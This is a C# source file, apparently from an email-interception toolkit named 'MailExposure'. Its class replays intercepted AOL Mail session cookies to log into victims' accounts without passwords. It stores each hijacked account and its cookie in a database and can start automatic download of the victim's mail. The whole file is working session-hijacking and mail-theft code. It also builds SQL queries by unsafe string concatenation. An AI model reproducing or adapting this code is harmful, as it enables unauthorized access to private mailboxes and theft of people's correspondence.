using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Net;
using System.Threading;

namespace MailExposure.CookieMailRC
{
    class FilterAolmail:DisplaceNew
    {
        // Fields
        private bool Auto;
        private string cookieRemarks;
        private string strCookie;
        private string urls;
        private string userListNames;
        private string UserName;

        // Methods
        public FilterAolmail(string url, string strCookie, string interceptTime, string userList, bool Auto, string cookieRemarks)
        {
            this.urls = "";
            this.UserName = "";
            this.strCookie = "";
            this.userListNames = "";
            this.cookieRemarks = "";
            base.url = url;
            base.cookie = strCookie;
            this.strCookie = strCookie;
            base.interceptTime = interceptTime;
            this.userListNames = userList;
            this.Auto = Auto;
            this.cookieRemarks = cookieRemarks;

        }
        public void loginUser()
        {
            base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
            base.streamControl = true;
            base.MyStringBuilder = this.Request(base.url);
            base.MyStringBuilder.ToString();
            if ((base.MyStringBuilder.ToString() != "") && (base.MyStringBuilder.ToString().IndexOf("@aol.com") != -1))
            {
                this.UserName = base.putstr(base.MyStringBuilder.ToString(), "\"UserName\":\"", "\"", 0);
            }
            if (((this.UserName != "") && (this.UserName != null)) && (this.UserName != "-1"))
            {
                string str = "'" + this.UserName + "'";
                string str2 = "'" + this.strCookie + "'";
                string str3 = "'cap163'";
                string str4 = "'aol'";
                string str5 = "'" + base.interceptTime + "'";
                string usertype = "'无密用户'";
                string str7 = "'是'";
                if (this.cookieRemarks.Length > 0)
                {
                    str3 = "'" + this.cookieRemarks + "'";
                }
                else
                {
                    str3 = "'" + DateTime.Now.ToString("yyyMMdd") + "'";
                }
                string str8 = this.Auto ? "1" : "0";
                str8 = "'" + str8 + "'";
                this.userListNames = "'" + this.userListNames + "'";
                string strSql = "insert into users(属主,用户名,服务器,服务器地址,方向,邮件地址,验证登陆,时间限制,用户类型,全部接收,用户列表) values(" + str3 + "," + str + "," + str4 + "," + str4 + "," + str3 + ",'" + base.url + "'," + str2 + "," + str5 + "," + usertype + "," + str7 + "," + this.userListNames + ")";
                string str10 = "select count(*)from users where 服务器地址=" + str4 + "and 用户名=" + str + "and 用户类型=" + usertype;
                string str11 = "update users set 邮件地址='" + base.url + "',验证登陆=" + str2 + " where 服务器地址=" + str4 + "and 用户名=" + str + "and 用户类型=" + usertype;
                if (Convert.ToInt32(GlobalValue.mainForm.ExecuteSQL(str10)) <= 0)
                {
                    GlobalValue.mainForm.ExecuteSQL(strSql);
                    GlobalValue.mainForm.listBoxView.Items.Add("添加用户：" + this.UserName);
                    GlobalValue.mainForm.listBoxView.Items.Add("[" + this.UserName + "]: 结束过滤");
                    GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
                    if (this.Auto)
                    {
                        new BeginReceiveThreads(1, "Aol", "Aol", this.UserName, "", str3.Trim(new char[] { '\'' }), "capAol", 0, base.url, this.strCookie, usertype, this.userListNames.Trim(new char[] { '\'' })).Execute();
                    }
                }
                else
                {
                    str10 = "select 时间限制 from users where 服务器地址=" + str4 + "and 用户名=" + str + "and 用户类型=" + usertype;
                    DateTime time = DateTime.Parse(GlobalValue.mainForm.ExecuteSQL(str10));
                    if (DateTime.Compare(DateTime.Parse(base.interceptTime), time) > 0)
                    {
                        GlobalValue.mainForm.ExecuteSQL(str11);
                        GlobalValue.mainForm.listBoxView.Items.Add("[" + this.UserName + "]：修改用户！");
                        GlobalValue.mainForm.listBoxView.Items.Add("[" + this.UserName + "]: 结束过滤");
                        GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
                        if (this.Auto)
                        {
                            new BeginReceiveThreads(1, "Aol", "Aol", this.UserName, "", str3.Trim(new char[] { '\'' }), "capAol", 0, base.url, this.strCookie, usertype, this.userListNames.Trim(new char[] { '\'' })).Execute();
                        }
                    }
                }
            }
            else
            {
                GlobalValue.mainForm.listBoxView.Items.Add("Cookie 可能已失效");
                GlobalValue.mainForm.listBoxView.Items.Add("结束过滤");
                GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
            }

        }
        private StringBuilder Request(string url)
        {
            try
            {
                StreamReader reader;
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "get";
                request.Accept = "image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, */*";
                request.AllowAutoRedirect = false;
                request.ServicePoint.Expect100Continue = false;
                request.KeepAlive = true;
                request.UserAgent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; EmbeddedWB 14.52 from: http://www.bsalsa.com/ EmbeddedWB 14.52; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; InfoPath.3)";
                request.ContentType = "application/x-www-form-urlencoded";
                request.Headers.Add("Accept-Language: zh-cn");
                request.Headers.Add("Cookie", base.cookie);
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                WebHeaderCollection headers = response.Headers;
                if (response.Headers["Set-Cookie"] != null)
                {
                    base.cookie = base.cook(response.Headers["Set-Cookie"]);
                }
                if (headers["Content-Type"] != null)
                {
                    string str = "";
                    str = headers["Content-Type"];
                    if (str.IndexOf("charset=") >= 0)
                    {
                        base.charSet = str.Substring(str.IndexOf("charset=") + 8, (str.Length - str.IndexOf("charset=")) - 8);
                    }
                }
                Thread.Sleep(10);
                if (((response.StatusCode == HttpStatusCode.Found) || (response.StatusCode == HttpStatusCode.MovedPermanently)) || ((response.StatusCode == HttpStatusCode.MovedPermanently) || (response.StatusCode == HttpStatusCode.Found)))
                {
                    this.urls = headers["location"];
                    if (this.urls.IndexOf("http") != -1)
                    {
                        string str2 = base.putstr(this.urls, "http:", "/mail/", 0);
                        if ((str2 != "-1") && (base.Host == null))
                        {
                            base.Host = "http:" + str2 + "/mail/";
                        }
                        this.Request(this.urls);
                    }
                }
                if ((base.charSet == null) || (base.charSet == "-1"))
                {
                    reader = new StreamReader(response.GetResponseStream(), Encoding.Default);
                }
                else
                {
                    reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(base.charSet));
                }
                if (base.streamControl)
                {
                    base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                    for (string str3 = reader.ReadLine(); str3 != null; str3 = reader.ReadLine())
                    {
                        base.MyStringBuilder.Append(str3 + "\r\n");
                        str3 = null;
                    }
                    base.streamControl = false;
                    reader.Close();
                }
                reader.Close();
            }
            catch (Exception exception)
            {
                base.ShowMessage("Hrequest:" + exception.Message);
            }
            return base.MyStringBuilder;
        }
    }
}
